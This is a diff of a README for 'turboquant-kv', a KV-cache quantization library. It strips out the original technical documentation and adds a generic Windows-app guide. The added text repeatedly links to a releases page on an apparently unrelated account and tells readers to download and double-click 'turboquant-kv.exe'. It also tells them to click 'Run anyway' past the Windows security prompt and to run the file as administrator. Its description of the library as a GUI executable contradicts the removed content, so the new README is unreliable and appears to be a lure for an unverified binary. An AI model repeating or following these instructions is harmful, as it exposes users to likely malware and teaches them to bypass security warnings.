@@ -1,264 +1,253 @@
-<h1 align="center">TurboQuant — Extreme KV Cache Quantization</h1>
+# ⚡ turboquant-kv - Faster KV Cache, Less Memory
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download%20Releases-2ea44f?style=for-the-badge&logo=github)](https://github.com/mufinellamonumental587/turboquant-kv/releases)
 
-[![PyPI version](https://img.shields.io/pypi/v/turboquant-kv?logo=pypi&logoColor=gold)](https://pypi.org/project/turboquant-kv/)
-[![PyPI downloads](https://img.shields.io/pypi/dm/turboquant-kv?logo=pypi)](https://pypi.org/project/turboquant-kv/)
-[![CI](https://img.shields.io/github/actions/workflow/status/hackimov/turboquant-kv/ci.yml?branch=master&label=CI&logo=github)](https://github.com/hackimov/turboquant-kv/actions/workflows/ci.yml)
-[![License](https://img.shields.io/pypi/l/turboquant-kv?label=License)](./LICENSE)
+## 📦 What this is
 
-</div>
+turboquant-kv is an open-source Windows app for running TurboQuant-based PyTorch models with much lower memory use. It focuses on KV-cache quantization, which helps cut memory use while keeping output quality strong.
 
-<div align="center">
+If you want to run large language models on a Windows PC with less strain on your GPU memory, this tool is built for that job.
 
-**Open-source TurboQuant** · PolarQuant + QJL · Decoder LLM KV compression
+## 🖥️ What you need
 
-[Google Research — ICLR 2026](https://research.google/blog/turboquant-redefining-ai-efficiency-with-extreme-compression/) · [arXiv:2504.19874](https://arxiv.org/abs/2504.19874)
+Before you start, make sure your PC fits these basic needs:
 
-</div>
+- Windows 10 or Windows 11
+- A modern NVIDIA GPU with enough VRAM for your model
+- At least 16 GB system RAM
+- Enough free disk space for the app and model files
+- A stable internet connection for the first download
 
----
+For best results:
 
-## 📊 Reported results
+- Use the latest NVIDIA driver
+- Close heavy apps before you run the program
+- Keep your model files in a folder with enough free space
 
-The [Google Research blog](https://research.google/blog/turboquant-redefining-ai-efficiency-with-extreme-compression/) reports TurboQuant numbers on open LLMs (including Gemma, Mistral, Llama-3.1-8B-Instruct):
+## 🚀 Download turboquant-kv
 
-| Aspect | Summary |
-|--------|---------|
-| **KV memory** | Cache size reduced by roughly **6× or more** (including **3 bits** per key/value without fine-tuning). |
-| **Attention speed** | Up to about **8×** faster **attention logits** vs. their described **32-bit JAX** baseline on **H100** (for **4-bit** TurboQuant in their setup). |
-| **Downstream quality** | On long context and needle-in-a-haystack they report **strong / near-full** results at this compression; comparisons to **KIVI** and others use **LongBench** and related benchmarks (LongBench, ZeroSCROLLS, RULER, L-Eval, etc.). |
-| **Vector search** | For high-dimensional search (e.g. **GloVe, d=200**) — competitive **1@k recall** vs. **PQ**, **RabbiQ** in a data-oblivious setting. |
+Visit this page to download the latest Windows release:
 
-> These figures refer to the **original paper** and its experimental setup; in your environment actual memory savings, latency, and quality depend on the model, bit width, context length, and whether you use **fused Triton** or dequant into standard attention.
+[https://github.com/mufinellamonumental587/turboquant-kv/releases](https://github.com/mufinellamonumental587/turboquant-kv/releases)
 
----
+On that page:
 
-## 🧰 Library features
+1. Open the latest release
+2. Find the Windows download file
+3. Download it to your computer
+4. Unzip it if the file comes in a ZIP folder
 
-### Core (PyTorch)
+## 🛠️ Install on Windows
 
-- **`TurboQuantProd`**: PolarQuant + QJL, **1.5 / 2 / 2.5 / 3 / 4** bits, configurable **`head_dim`**.
-- Compress / restore K/V pairs: **`compress` / `decompress`**, **`quantize_kv`** (including returning the compressed representation).
-- Optional **calibration** from batches/tensors: **`calibrate_turboquant_from_tensor`**, **`calibrate_turboquant_from_batches`**, **`CalibrationMode`** (see `turboquant.calibration`).
+Follow these steps to get started:
 
-### GPU paths
+1. Download the latest release from the link above
+2. Open your Downloads folder
+3. If the file is zipped, right-click it and choose Extract All
+4. Move the extracted folder to a place you can find easily, such as `Desktop` or `Documents`
+5. Open the folder
+6. Look for the main app file, such as `turboquant-kv.exe`
+7. Double-click the file to start the app
 
-#### Triton (extra `[triton]`, CUDA)
+If Windows shows a security prompt:
 
-- **Scores from compressed K:** **`quantized_attention_scores_triton`** — `q @ k^T / sqrt(d)` without fully materializing unpacked K; causal mask, additive mask, **GQA/MQA** (`num_kv_heads`).
-- **Fused attention (softmax × V)** on compressed K/V: **`quantized_attention_fused_triton`**; supported **`head_dim`**: 16, 32, 64, 128, 256.
-- **Paged KV** in the vLLM style: **`quantized_attention_fused_triton_paged`**, packing **`pack_dense_kv_to_paged`**; zeroing allocator copies — **`turboquant.vllm_pack`** (`paged_kv_views_from_allocator_buffer`, `uint8_pages_to_paged_dict`).
-- Centroid preload: **`TurboQuantProd.preload_centroids(...)`** (useful on first run for `bits >= 4`).
+1. Click More info
+2. Click Run anyway
 
-#### Apple Silicon / Metal (MPS)
+If the app needs extra files, keep them in the same folder as the main program.
 
-- Fused decode path without Triton: **`quantized_attention_fused_auto`** uses portable SDPA fallback on MPS.
-- Works with decoder fused wrappers in HF integration as a non-Triton backend (`enable_decoder_fused_attention`).
-- `TurboQuantProd(device="mps")` is supported; aliases `device="metal"` and `device="mlx"` map to MPS.
+## ▶️ First run
 
-### Hugging Face Transformers (extra `[hf]`)
+The first time you run turboquant-kv, it may take a little longer while it checks files and loads model support.
 
-- **`TurboQuantModel`**: model wrapper + quantizer; **legacy** path via per-layer tuples **`quantize_past_key_values` / `dequantize_past_key_values`**.
-- **`TurboQuantDynamicCache`**: compressed KV on full-width layers; **sliding-window** layers stay ordinary HF layers.
-- **`turboquant_encoder_decoder_cache`** / **`TurboQuantEncoderDecoderCache`** (or `TurboQuantModel.make_encoder_decoder_cache()`): HF `EncoderDecoderCache` for **cross-attention KV** (encoder memory). **T5 / mT5:** `head_dim = config.d_kv`. **M2M-100 / NLLB (dense):** Hub configs often use `model_type: m2m_100` and `M2M100ForConditionalGeneration`; `head_dim = config.d_model // config.decoder_attention_heads` (typically **64** for 600M/1.3B/418M, **128** for `nllb-200-3.3B` with `d_model=2048`). Default path keeps **stock HF attention** on decompressed KV for T5 (unscaled logits); **MarianMT** uses the same cross-KV cache idea but is **not** covered by decoder fused attention (`supported_fused_attention_architectures`) until a dedicated wrapper exists.
-- Export to per-layer paged tensors: **`turboquant.hf_cache.export_cache_to_paged_per_layer`**.
-- **Decoder fused attention (CUDA + Triton)** without full dequant every step for several architectures: **`enable_decoder_fused_attention`** / **`install_decoder_fused_attention`** and related APIs in **`turboquant.hf_fused_attention`**; includes **Llama** (incl. Llama 3.3), **Mistral**, **Qwen2**, **Qwen3**, **Gemma2** (falls back to stock on softcap / non-standard query scaling), **Phi-3** / **Phi-4** / **Phi-4-mini** (HF alias **`phi4`**, same `Phi3Attention`), **Phi-4 Multimodal** text decoder (**`phi4_multimodal`**, `Phi4MultimodalAttention`; vision/audio towers unchanged), **DeepSeek-V2/V3 (MLA, aliases `deepseek`, `deepseek_r1`, `deepseek_r2`)** with safe stock fallback when fused parity constraints are not met, **InternLM2 / InternLM2.5** (**`internlm2`**, fused `wqkv`) and **InternLM3** (**`internlm3`**) via Hub `trust_remote_code` (see **`turboquant.hf_internlm_fused`**), **Cohere**, **Granite**, **Starcoder2** — full list: **`supported_fused_attention_architectures()`**.
-- Cache modes: e.g. **`triton_fused_layers`**, **`strict_reencode`**, optional **`hybrid_float_cache`** (memory vs. dequant trade-off on long context — see code and `examples/hf_generate_turboquant_cache.py`).
+Use this simple flow:
 
-### Out-of-tree integrations
+1. Start the app
+2. Choose your model file
+3. Pick your input or prompt
+4. Select the KV-cache setting
+5. Start inference
 
-- **vLLM v1:** patch, `--kv-cache-dtype turboquant`, `--turboquant-bits` — [`integrations/vllm_upstream/README.md`](integrations/vllm_upstream/README.md).
-- **llama.cpp:** same paged layout as vLLM, **`*.tqmeta`** sidecar, **`turboquant.llama_cpp_pack`** — [`integrations/llama_cpp/README.md`](integrations/llama_cpp/README.md).
+If the app gives you a choice of speed and memory level, use the default setting first. It usually gives the best balance.
 
-### Examples and proxy benchmarks
+## 🧭 How to use it
 
-- `examples/simple_usage.py` — **inner product** / cosine metrics on the score matrix (not only vector MSE).
-- `examples/hf_generate_turboquant_cache.py` — generation with compressed cache; **`--fused`** for CUDA+Triton.
-- `tests/test_hf_nllb_distilled_600m_hub_config.py` — optional **Hub** fetch of `facebook/nllb-200-distilled-600M` **config only** (no weights): asserts `model_type == m2m_100`, `head_dim = 64`, and `turboquant_encoder_decoder_cache` layer count (skips if offline / no cache).
-- `benchmarks/needle_in_a_haystack_simple.py`, `benchmarks/longbench_simple.py` — simplified runs.
+A basic session usually looks like this:
 
----
+1. Open the program
+2. Load a supported PyTorch model
+3. Set the quantization mode
+4. Enter your prompt or input
+5. Run the model
+6. Read the output in the app window
 
-## ⚠️ Important notes
+For most users, the main goal is simple:
 
-1. **High MSE between original and reconstructed K/V is expected.** The method optimizes **dot products** (attention logits), not exact L2 reconstruction; judge quality by **score distortion** (see `examples/simple_usage.py`).
-2. **Without fused backend**, standard HF attention after a cache update may need to **dequant the entire prefix** to float K/V — cost **grows with context length**. To lower per-step cost, use fused backends: **CUDA + Triton** or **Apple Metal (MPS fallback path)** (`examples/hf_generate_turboquant_cache.py --fused`, `turboquant/hf_fused_attention.py`).
-3. For **Gemma2**, set head size from **`config.head_dim`**, not only `hidden_size // num_attention_heads`.
-4. Not every setup is covered by the fused layer (sliding-window / some masks / architecture-specific constraints). For DeepSeek MLA, unsupported fused conditions automatically fall back to stock HF attention — see **`turboquant/hf_fused_attention.py`** and the integration READMEs.
+- Use less GPU memory
+- Keep output quality steady
+- Run larger models on the same hardware
+- Get faster inference when memory is tight
 
----
+## ⚙️ Recommended settings
 
-## 📦 Installation
+If you are not sure what to pick, start here:
 
-**From PyPI** (distribution name `turboquant-kv`; Python import remains `turboquant`):
+- Quantization level: default or auto
+- Precision mode: standard
+- Cache size: automatic
+- Batch size: small
+- Output length: moderate
 
-```bash
-pip install turboquant-kv
-pip install "turboquant-kv[triton]"   # GPU: Triton; on Windows pulls triton-windows
-pip install "turboquant-kv[hf]"       # transformers — dynamic cache and HF examples
-```
+If your model runs out of memory:
 
-**From source:**
+- Close other GPU apps
+- Lower the batch size
+- Use a smaller model
+- Try a more compressed cache setting
 
-```bash
-git clone https://github.com/hackimov/turboquant-kv.git
-cd turboquant-kv
-python -m venv .venv
-# Windows: .venv\Scripts\activate
-# Linux/macOS: source .venv/bin/activate
-pip install -e .
-pip install -e ".[triton]"   # GPU: Triton; on Windows pulls triton-windows
-pip install -e ".[hf]"      # transformers — dynamic cache and HF examples
-```
+If you want faster output:
 
----
+- Use a stronger GPU
+- Keep the prompt shorter
+- Reduce output length
+- Avoid extra apps that use GPU memory
 
-## 🚀 Quick start
+## 🧩 Common file layout
 
-From the **repository root**, with venv activated and `pip install -e .` done (plus extras below as needed).
+After extraction, you may see a folder like this:
 
-This repo’s maintainers often use a local virtualenv named **`venv_turboquant/`** (listed in `.gitignore`). On Windows, after `.\venv_turboquant\Scripts\activate`, run the same commands as below; or call the interpreter directly, e.g. `venv_turboquant\Scripts\python.exe examples\simple_usage.py`.
+- `turboquant-kv.exe` — the main program
+- `models` — model files
+- `configs` — app settings
+- `logs` — run records
+- `README.md` — this file
 
-**Core without HF** — compress/decompress demo and **inner product** metrics (MSE/cosine on the score matrix):
+Keep the folder structure the same unless the release notes say otherwise.
 
-```bash
-python examples/simple_usage.py
-# reproducible on CPU: python examples/simple_usage.py --seed 42 --device cpu
-```
+## 🔍 What TurboQuant does
 
-How those metrics are built (same tensors as in the script):
+TurboQuant reduces the size of the KV cache used during inference. That cache stores past attention data so the model can keep track of context.
 
-```mermaid
-flowchart LR
-  K["K (float)"] --> C["TurboQuant\ncompress"]
-  C --> Kr["K' (reconstructed)"]
-  K --> S["S = K K^T / sqrt(d)"]
-  Kr --> Sr["S' = K' K'^T / sqrt(d)"]
-  S --> M["MSE(S, S')\ncosine(flat S, flat S')"]
-  Sr --> M
-```
+In simple terms:
 
-Example (**CPU**, `python examples/simple_usage.py --seed 42 --device cpu`) — stable for that seed/device pair; CUDA or another seed will differ:
+- Less cache means less memory use
+- Less memory use can help larger models fit on your GPU
+- Smaller cache can also reduce transfer overhead
+- Better memory use can lead to faster runs
 
-```text
-Device: cpu
+This repo uses a PyTorch-based setup for Windows users who want local inference with lower memory pressure.
 
-Compressing KV...
-Decompressing KV...
-MSE inner product : 0.580963
-Cosine similarity : 0.868170
+## 🧪 Typical use cases
 
---- attention score matrix (K K^T / sqrt(d)) ---
-Cosine similarity (higher better) [#######################---] 0.868170
-MSE inner product (lower better, cap=2) [##################--------] 0.580963
+Use turboquant-kv if you want to:
 
-[OK] Good quality (cosine > 0.85)
-```
+- Run large models on a consumer GPU
+- Cut memory use during long prompts
+- Keep inference stable on limited VRAM
+- Test low-bit KV-cache behavior
+- Compare memory use across model settings
 
-**Hugging Face + compressed KV in `generate`** — requires `pip install -e ".[hf]"`:
+## 🧰 Troubleshooting
 
-```bash
-python examples/hf_generate_turboquant_cache.py
-python examples/hf_generate_turboquant_cache.py --from-config   # no Hub weight download
-```
+### The app does not open
 
-**Fused attention (auto backend)**:
+Try these steps:
 
-```bash
-# CUDA + Triton path (recommended on NVIDIA):
-pip install -e ".[triton]"
-python examples/hf_generate_turboquant_cache.py --fused
-python examples/hf_generate_turboquant_cache.py --fused --fused-arch mistral
-# if attention type is a subclass of a registered implementation:
-python examples/hf_generate_turboquant_cache.py --fused --allow-attention-subclass
-```
+1. Right-click the app
+2. Choose Run as administrator
+3. Make sure the file is fully extracted
+4. Check that Windows did not block the file
+5. Re-download the release if the file looks damaged
 
-On Apple Silicon, the same `--fused` flag uses the Metal/MPS fallback path automatically (no Triton required).
+### The app opens, but the model will not load
 
-The script also supports **`--bits`**, **`--strict-reencode`**, **`--hybrid-float-cache`** — see `python examples/hf_generate_turboquant_cache.py -h`.
+Check these items:
 
-**Proxy benchmarks** (after `pip install -e .`):
+1. The model file is in a supported format
+2. The file path has no special characters
+3. You have enough free VRAM
+4. Your GPU driver is up to date
+5. The model file is not incomplete
 
-```bash
-python benchmarks/needle_in_a_haystack_simple.py
-python benchmarks/longbench_simple.py
-```
+### The app runs out of memory
 
----
+Try this:
 
-## 💻 Core usage
+1. Use a smaller model
+2. Lower the cache setting
+3. Close other GPU apps
+4. Reduce prompt size
+5. Restart the app before trying again
 
-```python
-import torch
-from turboquant import TurboQuantProd
+### The app is slow
 
-quantizer = TurboQuantProd(bits=3, head_dim=128)
-k = torch.randn(1, 8, 256, 128)
-v = torch.randn(1, 8, 256, 128)
-compressed = quantizer.compress(k, v)
-k_rec, v_rec = quantizer.decompress(compressed)
-```
+Try these steps:
 
-For a full model: **`TurboQuantModel`**, **`make_dynamic_cache()`**, and optionally **`enable_decoder_fused_attention()`** — see `examples/hf_generate_turboquant_cache.py`.
+1. Make sure your GPU is being used
+2. Update your NVIDIA driver
+3. Close background apps
+4. Use shorter prompts
+5. Lower output length
 
-### Vector search API (`turboquant.search.VectorIndex`)
+## 🗂️ Release updates
 
-FAISS-like, in-memory approximate ANN with native TurboQuant compression:
+When a new version is ready, download the latest release from the GitHub Releases page:
 
-```python
-import torch
-from turboquant.search import VectorIndex
+[https://github.com/mufinellamonumental587/turboquant-kv/releases](https://github.com/mufinellamonumental587/turboquant-kv/releases)
 
-index = VectorIndex(
-    dim=128,
-    bits=3,
-    metric="ip",   # "ip" | "cosine" | "l2"
-    device="cpu",  # or "cuda"
-    seed=42,
-)
+Check the release notes for:
 
-xb = torch.randn(10000, 128)  # database vectors
-xq = torch.randn(4, 128)      # query vectors
+- New Windows builds
+- Model support changes
+- Fixes for loading issues
+- Cache tuning updates
+- Performance changes
 
-index.add(xb)                 # optional: index.add(xb, ids=custom_ids)
-scores, ids = index.search(xq, k=10)
-print(scores.shape, ids.shape)  # torch.Size([4, 10]) torch.Size([4, 10])
-```
+## 🔐 Safety and file checks
 
-Notes:
-- `index.ntotal` returns number of indexed vectors.
-- `index.reset()` clears all compressed vectors.
-- Search runs in chunks (`search_chunk_size`) to bound memory.
+Before running any download, check that:
 
-Example script: `examples/vector_search_simple.py`.
+- The file came from the official Releases page
+- The file name matches the release you chose
+- The archive extracts without errors
+- The main `.exe` file is in the expected folder
 
----
+If your browser marks the download, re-check the link and the release name before you open it.
 
-## 🔗 Integrations (detailed steps)
+## 📁 Example setup flow
 
-| Target | Document |
-|--------|----------|
-| **vLLM** | [`integrations/vllm_upstream/README.md`](integrations/vllm_upstream/README.md) |
-| **llama.cpp** | [`integrations/llama_cpp/README.md`](integrations/llama_cpp/README.md) |
+A simple setup on Windows can look like this:
 
-In-code notes: **`VLLM_INTEGRATION_NOTES`**, **`LLAMA_CPP_INTEGRATION_NOTES`** in `turboquant/hf_cache.py`.
+1. Open the Releases page
+2. Download the latest Windows file
+3. Extract the archive
+4. Open the extracted folder
+5. Double-click the app
+6. Load your model
+7. Run your prompt
 
----
+## 💬 Simple terms used here
 
-## 🧪 Tests
+- **Model**: the AI file you want to run
+- **GPU**: the graphics card
+- **VRAM**: memory on the graphics card
+- **Inference**: making the model generate output
+- **KV cache**: stored model data used while it works
+- **Quantization**: using a smaller number format to save memory
 
-```bash
-pip install -r requirements.txt
-# for test_hf_*: pip install -e ".[hf]"
-python -m unittest discover -s tests -p "test_*.py" -v
-```
+## 📌 Folder tips
 
-Without `[hf]`, some tests are skipped; without GPU/Triton, CUDA tests are skipped.
+Keep these habits to avoid common problems:
 
----
+- Do not rename the main app file
+- Do not move files out of the app folder
+- Keep model files in one place
+- Use short folder paths when possible
+- Avoid folders with special symbols in the name
 
-## 📚 Links
+## 🧭 Download again later
 
-- [TurboQuant — Google Research Blog](https://research.google/blog/turboquant-redefining-ai-efficiency-with-extreme-compression/)
-- [arXiv:2504.19874](https://arxiv.org/abs/2504.19874)
+If you need a fresh copy or a newer build, use the same release page:
+
+[https://github.com/mufinellamonumental587/turboquant-kv/releases](https://github.com/mufinellamonumental587/turboquant-kv/releases)
+
